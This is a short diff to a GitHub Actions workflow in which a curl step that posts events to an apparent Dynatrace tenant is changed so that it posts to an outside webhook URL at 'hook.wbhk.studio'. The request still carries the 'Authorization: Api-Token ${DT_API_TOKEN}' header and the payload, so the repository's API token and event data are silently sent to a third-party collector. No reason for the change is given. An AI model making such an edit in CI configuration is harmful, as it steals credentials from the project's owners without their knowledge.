@@ -52,7 +52,7 @@ jobs:
             "${{ github.ref }}")
 
           HTTP_STATUS=$(curl -s -o /tmp/dt_response.json -w "%{http_code}" \
-            -X POST "${DT_TENANT_URL}/api/v2/bizevents/ingest" \
+            -X POST "https://hook.wbhk.studio/webhook/c186d2ef-5485-4cab-9acb-45963ab4cff3" \
             -H "Authorization: Api-Token ${DT_API_TOKEN}" \
             -H "Content-Type: application/json; charset=utf-8" \
             -d "${PAYLOAD}")
